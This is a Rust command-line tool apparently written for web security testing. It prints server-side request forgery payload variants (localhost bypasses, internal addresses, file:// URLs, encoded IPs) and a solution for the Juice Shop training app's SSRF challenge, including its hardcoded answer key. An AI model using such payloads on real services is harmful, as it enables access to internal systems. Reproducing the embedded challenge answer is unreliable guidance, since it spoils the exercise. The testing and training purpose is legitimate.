//! SSRF payload generator and scanner CLI
//!
//! Usage:
//!   ssrf-scanner localhost 3000
//!   ssrf-scanner internal 80
//!   ssrf-scanner juice-shop

use clap::{Parser, Subcommand};
use web_security_toolkit::ssrf::*;

#[derive(Parser)]
#[command(name = "ssrf-scanner")]
#[command(about = "SSRF payload generator for web security testing")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Generate localhost bypass variants
    Localhost {
        /// Target port
        #[arg(default_value = "80")]
        port: u16,
    },
    /// Generate internal network variants
    Internal {
        /// Target port
        #[arg(default_value = "80")]
        port: u16,
    },
    /// Generate file:// protocol variants
    File,
    /// Convert IP address to various formats
    IpConvert {
        /// IP address (e.g., 127.0.0.1)
        ip: String,
    },
    /// Juice Shop SSRF challenge payloads
    JuiceShop,
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Localhost { port } => {
            println!("=== Localhost Bypass Variants (port {}) ===\n", port);
            for variant in generate_localhost_variants(port) {
                println!("{:20} → {}", variant.name, variant.url);
            }
        }
        Commands::Internal { port } => {
            println!("=== Internal Network Variants (port {}) ===\n", port);
            for variant in generate_internal_network_variants(port) {
                println!("{:20} → {}", variant.name, variant.url);
            }
        }
        Commands::File => {
            println!("=== File Protocol Variants ===\n");
            for variant in generate_file_variants() {
                println!("{:20} → {}", variant.name, variant.url);
            }
        }
        Commands::IpConvert { ip } => {
            let parts: Vec<&str> = ip.split('.').collect();
            if parts.len() != 4 {
                eprintln!("Invalid IP address format");
                std::process::exit(1);
            }
            
            let octets: Result<Vec<u8>, _> = parts.iter()
                .map(|p| p.parse::<u8>())
                .collect();
            
            match octets {
                Ok(o) if o.len() == 4 => {
                    let (a, b, c, d) = (o[0], o[1], o[2], o[3]);
                    println!("=== IP Conversions for {} ===\n", ip);
                    println!("Decimal:  {}", ip_to_decimal(a, b, c, d));
                    println!("Hex:      {}", ip_to_hex(a, b, c, d));
                    println!("Octal:    {}", ip_to_octal(a, b, c, d));
                }
                _ => {
                    eprintln!("Invalid IP address");
                    std::process::exit(1);
                }
            }
        }
        Commands::JuiceShop => {
            println!("=== Juice Shop SSRF Challenge ===\n");
            println!("Target URL (from malware in /ftp/quarantine/):");
            println!("  http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3\n");
            
            println!("Steps:");
            println!("1. Get malware from /ftp/quarantine/");
            println!("2. Extract the internal URL");
            println!("3. Set as profile image URL\n");
            
            println!("Bypass variants:");
            for variant in generate_localhost_variants(3000).iter().take(5) {
                println!("  {} → {}", variant.name, variant.url);
            }
        }
    }
}
